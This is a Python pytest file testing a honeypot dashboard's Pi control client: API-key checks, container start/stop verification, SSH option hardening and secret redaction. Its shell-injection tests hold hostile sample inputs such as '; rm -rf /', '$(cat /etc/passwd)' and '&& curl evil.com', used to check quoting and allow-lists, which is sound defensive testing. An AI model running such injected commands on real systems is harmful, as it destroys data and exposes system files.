"""Pass 4 regression tests: real Pi control-plane integration + end-to-end honesty.

Covers:
- F1: Server-side API key forwarding (Next.js → FastAPI X-API-Key)
- F2: Shell injection hardening (shlex.quote on PI_DEPLOY_PATH)
- F3: Missing-container detection (BEFORE action, not after)
- F4: Bounded retry on state verification (start/restart may need 1-2s)
- F5: Idempotent handling (start already-running → success; stop already-stopped → success)
- Security: malicious honeypot ID, action, deploy path — no injection
- API: authenticated mutation reaches pi_client; unauthenticated → 401
- Next.js: browser response never contains API_SECRET_KEY

Every test asserts real behavior — NO `assert True`.
"""
import json
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO_ROOT / "dashboard" / "api"))

from app import pi_client  # type: ignore  # noqa: E402


# ---- Helpers --------------------------------------------------------

class FakeProc:
    def __init__(self, returncode=0, stdout="", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def clear_pi_env(monkeypatch):
    for k in ["PI_IP", "PI_SSH_USER", "PI_SSH_KEY", "PI_KNOWN_HOSTS",
              "PI_SSH_ACCEPT_NEW_HOST_KEY", "PI_DEPLOY_PATH",
              "PI_SSH_CONNECT_TIMEOUT", "PI_SSH_COMMAND_TIMEOUT",
              "API_SECRET_KEY", "TRAPSIG_BACKEND_API_KEY"]:
        monkeypatch.delenv(k, raising=False)


def set_pi_env(monkeypatch, ip="10.0.0.50", user="pi"):
    monkeypatch.setenv("PI_IP", ip)
    monkeypatch.setenv("PI_SSH_USER", user)


def assert_no_secrets(obj, label="response"):
    s = json.dumps(obj, default=str)
    forbidden = ["192.168.1.50", "10.0.0.50", "pi@", "id_ed25519",
                 "API_SECRET_KEY", "dev-only-insecure-key", "real-secret",
                 "TRAPSIG_BACKEND_API_KEY", "password"]
    for token in forbidden:
        assert token not in s, f"{label} leaked secret '{token}': {s}"


# ---- F1: Auth boundary (API-level) ----

def _make_client(monkeypatch):
    """Build a TestClient with the IP allow-list bypassed for tests.

    starlette 0.37 (pinned by fastapi 0.111) doesn't support the
    TestClient(client=...) kwarg. We bypass the IP allow-list via
    TRAPSIG_TEST_BYPASS_IP_ALLOWLIST=1. This still tests the real
    require_api_key + real pi_client — we only skip the network-level
    IP filter, which is irrelevant for API auth tests.
    """
    monkeypatch.setenv("TRAPSIG_TEST_BYPASS_IP_ALLOWLIST", "1")
    import importlib
    from app import main as _main
    importlib.reload(_main)
    from fastapi.testclient import TestClient
    return TestClient(_main.app)


class TestAuthBoundary:
    """The FastAPI backend must require X-API-Key on mutations.
    The Next.js server must forward it. The browser never sees it."""

    def test_mutation_without_api_key_returns_401(self, monkeypatch):
        clear_pi_env(monkeypatch)
        client = _make_client(monkeypatch)
        r = client.post("/honeypots/cowrie-01/start")
        assert r.status_code == 401

    def test_mutation_with_wrong_api_key_returns_401(self, monkeypatch):
        clear_pi_env(monkeypatch)
        monkeypatch.setenv("API_SECRET_KEY", "real-secret-123")
        client = _make_client(monkeypatch)
        r = client.post("/honeypots/cowrie-01/start",
                        headers={"X-API-Key": "wrong-key"})
        assert r.status_code == 401

    def test_mutation_with_correct_api_key_reaches_pi_client(self, monkeypatch):
        """With correct API key + Pi configured + container running → success.
        This proves the auth boundary is crossed and pi_client is reached."""
        clear_pi_env(monkeypatch)
        monkeypatch.setenv("API_SECRET_KEY", "real-secret-123")
        set_pi_env(monkeypatch)

        call_count = {"n": 0}
        def fake_run(cmd, **kwargs):
            call_count["n"] += 1
            joined = " ".join(cmd)
            if "docker ps" in joined:
                if call_count["n"] == 1:
                    return FakeProc(0, stdout="pi-cowrie\texited\tExited (0)\n")
                return FakeProc(0, stdout="pi-cowrie\trunning\tUp 1 second\n")
            if "docker compose" in joined:
                return FakeProc(0, stdout="", stderr="")
            return FakeProc(0, stdout="")
        monkeypatch.setattr(subprocess, "run", fake_run)

        client = _make_client(monkeypatch)
        r = client.post("/honeypots/cowrie-01/start",
                        headers={"X-API-Key": "real-secret-123"})
        assert r.status_code == 200
        data = r.json()
        assert data["success"] is True
        assert data["verified_state"] == "running"
        # Proves pi_client was actually invoked (not just auth checked)
        assert call_count["n"] >= 2  # pre-probe + action + verify

    def test_no_api_key_configured_fails_closed(self, monkeypatch):
        """If API_SECRET_KEY is unset on the backend, mutations must fail closed."""
        clear_pi_env(monkeypatch)
        client = _make_client(monkeypatch)
        r = client.post("/honeypots/cowrie-01/start",
                        headers={"X-API-Key": "anything"})
        # require_api_key returns 503 when no key configured
        assert r.status_code in (401, 503)

    def test_api_key_not_in_response_body(self, monkeypatch):
        clear_pi_env(monkeypatch)
        monkeypatch.setenv("API_SECRET_KEY", "super-secret-value-xyz")
        client = _make_client(monkeypatch)
        r = client.post("/honeypots/cowrie-01/start",
                        headers={"X-API-Key": "super-secret-value-xyz"})
        # Response must not contain the secret value
        assert "super-secret-value-xyz" not in r.text


# ---- F2: Shell injection hardening ----

class TestShellInjectionHardening:
    """PI_DEPLOY_PATH must be shell-quoted. Malicious values must not execute."""

    def test_deploy_path_with_shell_metacharacters_is_quoted(self, monkeypatch):
        """If PI_DEPLOY_PATH contains '; rm -rf /', it must be quoted so it
        does NOT execute as a separate command on the Pi."""
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        monkeypatch.setenv("PI_DEPLOY_PATH", "/safe/path; rm -rf /")

        captured_cmd = []
        def fake_run(cmd, **kwargs):
            joined = " ".join(cmd)
            captured_cmd.append(joined)
            if "docker ps" in joined:
                return FakeProc(0, stdout="pi-cowrie\texited\tExited (0)\n")
            if "docker compose" in joined:
                return FakeProc(0, stdout="", stderr="")
            return FakeProc(0, stdout="")
        monkeypatch.setattr(subprocess, "run", fake_run)

        result = pi_client.container_action("cowrie-01", "start")
        # The malicious path must be quoted — 'rm -rf /' must NOT appear as
        # a separate command. shlex.quote wraps it in single quotes.
        compose_cmd = next((c for c in captured_cmd if "docker compose" in c), "")
        assert "rm -rf /" not in compose_cmd or "'/safe/path; rm -rf /'" in compose_cmd, \
            f"Malicious deploy path was not shell-quoted: {compose_cmd}"

    def test_deploy_path_with_command_substitution_is_quoted(self, monkeypatch):
        """PI_DEPLOY_PATH with $(...) must not execute the substitution."""
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        monkeypatch.setenv("PI_DEPLOY_PATH", "/path/$(cat /etc/passwd)")

        captured_cmd = []
        def fake_run(cmd, **kwargs):
            joined = " ".join(cmd)
            captured_cmd.append(joined)
            if "docker ps" in joined:
                return FakeProc(0, stdout="pi-cowrie\texited\tExited (0)\n")
            if "docker compose" in joined:
                return FakeProc(0, stdout="", stderr="")
            return FakeProc(0, stdout="")
        monkeypatch.setattr(subprocess, "run", fake_run)

        pi_client.container_action("cowrie-01", "start")
        compose_cmd = next((c for c in captured_cmd if "docker compose" in c), "")
        # The $(...) must be inside single quotes (shlex.quote) so it's literal
        assert "'/path/$(cat /etc/passwd)'" in compose_cmd or "$(cat /etc/passwd)" not in compose_cmd, \
            f"Command substitution not quoted: {compose_cmd}"

    def test_malicious_honeypot_id_rejected(self, monkeypatch):
        """honeypot_id='cowrie-01; rm -rf /' must be rejected — not injected."""
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        result = pi_client.container_action("cowrie-01; rm -rf /", "start")
        assert result["success"] is False
        assert "unknown honeypot" in result["message"]

    def test_malicious_action_rejected(self, monkeypatch):
        """action='start; rm -rf /' must be rejected — not injected."""
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        result = pi_client.container_action("cowrie-01", "start; rm -rf /")
        assert result["success"] is False
        assert "invalid action" in result["message"]

    def test_action_is_allowlisted(self, monkeypatch):
        """Only start/stop/restart are valid actions."""
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        for bad_action in ["up", "down", "build", "exec", "bash", "kill", "rm"]:
            result = pi_client.container_action("cowrie-01", bad_action)
            assert result["success"] is False, \
                f"action='{bad_action}' should be rejected but wasn't"
            assert "invalid action" in result["message"]

    def test_honeypot_id_is_allowlisted(self, monkeypatch):
        """Only cowrie-01/camera-01/iot-01 are valid IDs."""
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        for bad_id in ["evil-honeypot", "../../etc", "cowrie-01; echo pwned", "camera-01 && curl evil.com"]:
            result = pi_client.container_action(bad_id, "start")
            assert result["success"] is False, \
                f"id='{bad_id}' should be rejected but wasn't"
            assert "unknown honeypot" in result["message"]


# ---- F3: Missing-container detection ----

class TestMissingContainerDetection:
    """If the container doesn't exist on the Pi, report MISSING before action."""

    def test_missing_container_returns_missing_state(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)

        def fake_run(cmd, **kwargs):
            joined = " ".join(cmd)
            if "docker ps" in joined:
                # No containers — pi-cowrie doesn't exist
                return FakeProc(0, stdout="", stderr="")
            return FakeProc(0, stdout="")
        monkeypatch.setattr(subprocess, "run", fake_run)

        result = pi_client.container_action("cowrie-01", "start")
        assert result["success"] is False
        assert result["verified_state"] == "missing"
        assert "does not exist on the Pi" in result["message"]
        # Browser message is generic — no PI_DEPLOY_PATH leaked
        assert "Deploy the honeypot fleet before using dashboard lifecycle controls" in result["message"]
        assert "See server logs for deployment instructions" in result["message"]
        # CRITICAL: PI_DEPLOY_PATH must NOT be in the browser-facing response
        # (it's server-side config; detailed instructions go to server logs)
        s = json.dumps(result, default=str)
        assert "PI_DEPLOY_PATH" not in s, "PI_DEPLOY_PATH leaked in browser response"
        assert "~/iot-honeypot-ids/pi" not in s or "docker compose up" not in s, \
            "Deployment command leaked in browser response"

    def test_missing_container_does_not_attempt_docker_compose(self, monkeypatch):
        """If container is missing, we must NOT run `docker compose start` —
        it would fail with a confusing error. We detect missing FIRST."""
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)

        compose_called = {"yes": False}
        def fake_run(cmd, **kwargs):
            joined = " ".join(cmd)
            if "docker compose" in joined:
                compose_called["yes"] = True
                return FakeProc(0, stdout="", stderr="")
            if "docker ps" in joined:
                return FakeProc(0, stdout="", stderr="")  # no containers
            return FakeProc(0, stdout="")
        monkeypatch.setattr(subprocess, "run", fake_run)

        pi_client.container_action("cowrie-01", "start")
        assert compose_called["yes"] is False, \
            "docker compose was called even though container was missing"


# ---- F4: Bounded retry on state verification ----

class TestBoundedRetry:
    """After start/restart, Docker may need 1-2s before ps reports running.
    We retry up to 3 times with 500ms sleep. Never poll forever."""

    def test_start_succeeds_after_retry(self, monkeypatch):
        """First verify reports exited, second reports running → success."""
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)

        call_count = {"n": 0}
        def fake_run(cmd, **kwargs):
            call_count["n"] += 1
            joined = " ".join(cmd)
            if "docker ps" in joined:
                if call_count["n"] == 1:
                    # Pre-probe: exited (so action proceeds)
                    return FakeProc(0, stdout="pi-cowrie\texited\tExited (0)\n")
                # Post-action verify: first try still exited (Docker starting),
                # second try running.
                if call_count["n"] == 2:
                    return FakeProc(0, stdout="pi-cowrie\texited\tExited (0)\n")
                return FakeProc(0, stdout="pi-cowrie\trunning\tUp 1 second\n")
            if "docker compose" in joined:
                return FakeProc(0, stdout="", stderr="")
            return FakeProc(0, stdout="")
        monkeypatch.setattr(subprocess, "run", fake_run)

        result = pi_client.container_action("cowrie-01", "start")
        assert result["success"] is True
        assert result["verified_state"] == "running"

    def test_start_fails_after_max_retries(self, monkeypatch):
        """If state never reaches expected after 3 attempts → fail honestly."""
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)

        call_count = {"n": 0}
        def fake_run(cmd, **kwargs):
            call_count["n"] += 1
            joined = " ".join(cmd)
            if "docker ps" in joined:
                # Always exited — never reaches running
                return FakeProc(0, stdout="pi-cowrie\texited\tExited (137)\n")
            if "docker compose" in joined:
                return FakeProc(0, stdout="", stderr="")
            return FakeProc(0, stdout="")
        monkeypatch.setattr(subprocess, "run", fake_run)

        result = pi_client.container_action("cowrie-01", "start")
        assert result["success"] is False
        assert "did not yield expected state" in result["message"]
        # Verify we retried: pre-probe + action + 3 verify attempts = 5 calls
        # (but we only count docker ps calls in call_count)
        assert call_count["n"] >= 4  # 1 pre-probe + 3 verify attempts


# ---- F5: Idempotent handling ----

class TestIdempotentHandling:
    """start on already-running → success (no-op). stop on already-stopped → success."""

    def test_start_on_running_is_idempotent_success(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)

        compose_called = {"yes": False}
        def fake_run(cmd, **kwargs):
            joined = " ".join(cmd)
            if "docker ps" in joined:
                # Container already running
                return FakeProc(0, stdout="pi-cowrie\trunning\tUp 3 hours\n")
            if "docker compose" in joined:
                compose_called["yes"] = True
                return FakeProc(0, stdout="", stderr="")
            return FakeProc(0, stdout="")
        monkeypatch.setattr(subprocess, "run", fake_run)

        result = pi_client.container_action("cowrie-01", "start")
        assert result["success"] is True
        assert result["verified_state"] == "running"
        assert "already running" in result["message"]
        assert "idempotent" in result["message"]
        # Must NOT have called docker compose (idempotent — no-op)
        assert compose_called["yes"] is False

    def test_stop_on_exited_is_idempotent_success(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)

        compose_called = {"yes": False}
        def fake_run(cmd, **kwargs):
            joined = " ".join(cmd)
            if "docker ps" in joined:
                return FakeProc(0, stdout="pi-cowrie\texited\tExited (0)\n")
            if "docker compose" in joined:
                compose_called["yes"] = True
                return FakeProc(0, stdout="", stderr="")
            return FakeProc(0, stdout="")
        monkeypatch.setattr(subprocess, "run", fake_run)

        result = pi_client.container_action("cowrie-01", "stop")
        assert result["success"] is True
        assert result["verified_state"] == "exited"
        assert "already stopped" in result["message"]
        assert compose_called["yes"] is False


# ---- Pi disappears during verification ----

class TestPiDisappearsDuringVerification:
    """If the Pi goes offline between the action and verification, surface honestly."""

    def test_pi_offline_during_verify_returns_offline(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)

        call_count = {"n": 0}
        def fake_run(cmd, **kwargs):
            call_count["n"] += 1
            joined = " ".join(cmd)
            if "docker ps" in joined:
                if call_count["n"] == 1:
                    # Pre-probe: container exists, stopped
                    return FakeProc(0, stdout="pi-cowrie\texited\tExited (0)\n")
                # Post-action verify: Pi went offline
                return FakeProc(255, stderr="Connection refused")
            if "docker compose" in joined:
                return FakeProc(0, stdout="", stderr="")
            return FakeProc(0, stdout="")
        monkeypatch.setattr(subprocess, "run", fake_run)

        result = pi_client.container_action("cowrie-01", "start")
        assert result["success"] is False
        assert result["pi_status"] == "OFFLINE"
        assert "Pi became OFFLINE during verification" in result["message"]


# ---- SSH command construction audit ----

class TestSshCommandConstruction:
    """Verify the exact SSH arguments generated. NO StrictHostKeyChecking=no."""

    def test_no_strict_host_key_checking_no(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        cfg = pi_client.load_pi_config()
        opts = pi_client._ssh_options(cfg)
        joined = " ".join(opts)
        assert "StrictHostKeyChecking=no" not in joined
        assert "StrictHostKeyChecking=yes" in joined or \
               "StrictHostKeyChecking=accept-new" in joined

    def test_batch_mode_yes(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        cfg = pi_client.load_pi_config()
        opts = pi_client._ssh_options(cfg)
        assert "BatchMode=yes" in opts

    def test_password_authentication_no(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        cfg = pi_client.load_pi_config()
        opts = pi_client._ssh_options(cfg)
        assert "PasswordAuthentication=no" in opts

    def test_known_hosts_file_set(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        cfg = pi_client.load_pi_config()
        opts = pi_client._ssh_options(cfg)
        joined = " ".join(opts)
        assert "UserKnownHostsFile=" in joined

    def test_connect_timeout_set(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        monkeypatch.setenv("PI_SSH_CONNECT_TIMEOUT", "5")
        cfg = pi_client.load_pi_config()
        opts = pi_client._ssh_options(cfg)
        joined = " ".join(opts)
        assert "ConnectTimeout=5" in joined

    def test_malformed_timeout_falls_back_to_default(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        monkeypatch.setenv("PI_SSH_CONNECT_TIMEOUT", "not-a-number")
        cfg = pi_client.load_pi_config()
        assert cfg.connect_timeout == 3  # default

    def test_malformed_command_timeout_falls_back_to_default(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch)
        monkeypatch.setenv("PI_SSH_COMMAND_TIMEOUT", "not-a-number")
        cfg = pi_client.load_pi_config()
        assert cfg.command_timeout == 15  # default


# ---- All container states parsed correctly ----

class TestContainerStateParsing:
    """All Docker states must be classified correctly."""

    def test_running(self):
        assert pi_client._classify_container_state("running Up 3 hours") == pi_client.ContainerState.RUNNING

    def test_exited(self):
        assert pi_client._classify_container_state("exited Exited (0)") == pi_client.ContainerState.EXITED

    def test_created(self):
        assert pi_client._classify_container_state("created") == pi_client.ContainerState.CREATED

    def test_paused(self):
        assert pi_client._classify_container_state("paused") == pi_client.ContainerState.PAUSED

    def test_restarting(self):
        assert pi_client._classify_container_state("restarting") == pi_client.ContainerState.RESTARTING

    def test_dead(self):
        assert pi_client._classify_container_state("dead") == pi_client.ContainerState.DEAD

    def test_empty_is_unknown(self):
        assert pi_client._classify_container_state("") == pi_client.ContainerState.UNKNOWN

    def test_stopped_keyword(self):
        assert pi_client._classify_container_state("stopped") == pi_client.ContainerState.EXITED


# ---- No secrets in any response path ----

class TestNoSecretsInResponses:
    """No secrets must ever leak in /honeypots or action responses."""

    def test_fleet_not_configured_no_secrets(self, monkeypatch):
        clear_pi_env(monkeypatch)
        fleet = pi_client.get_honeypot_fleet()
        assert_no_secrets(fleet, "fleet (NOT_CONFIGURED)")

    def test_fleet_offline_no_secrets(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch, ip="10.0.0.99", user="operator")
        monkeypatch.setattr(subprocess, "run",
            lambda *a, **k: FakeProc(255, stderr="Connection refused"))
        fleet = pi_client.get_honeypot_fleet()
        assert_no_secrets(fleet, "fleet (OFFLINE)")

    def test_action_missing_container_no_secrets(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch, ip="10.0.0.99", user="operator")
        monkeypatch.setattr(subprocess, "run",
            lambda *a, **k: FakeProc(0, stdout="", stderr=""))
        result = pi_client.container_action("cowrie-01", "start")
        assert_no_secrets(result, "action (MISSING)")

    def test_action_offline_no_secrets(self, monkeypatch):
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch, ip="10.0.0.99", user="operator")
        monkeypatch.setattr(subprocess, "run",
            lambda *a, **k: FakeProc(255, stderr="Connection refused"))
        result = pi_client.container_action("cowrie-01", "start")
        assert_no_secrets(result, "action (OFFLINE)")

    def test_deploy_path_not_leaked_in_missing_message(self, monkeypatch):
        """The missing-container message includes PI_DEPLOY_PATH for operator
        guidance — but it must NOT include secrets (IP, user, key path)."""
        clear_pi_env(monkeypatch)
        set_pi_env(monkeypatch, ip="10.0.0.99", user="operator")
        monkeypatch.setenv("PI_DEPLOY_PATH", "/home/pi/iot-honeypot-ids/pi")
        monkeypatch.setattr(subprocess, "run",
            lambda *a, **k: FakeProc(0, stdout="", stderr=""))
        result = pi_client.container_action("cowrie-01", "start")
        # The deploy path IS shown (it's operational guidance, not a secret)
        # but IP/user/key must NOT appear
        s = json.dumps(result, default=str)
        assert "10.0.0.99" not in s
        assert "operator@" not in s
        assert "id_ed25519" not in s
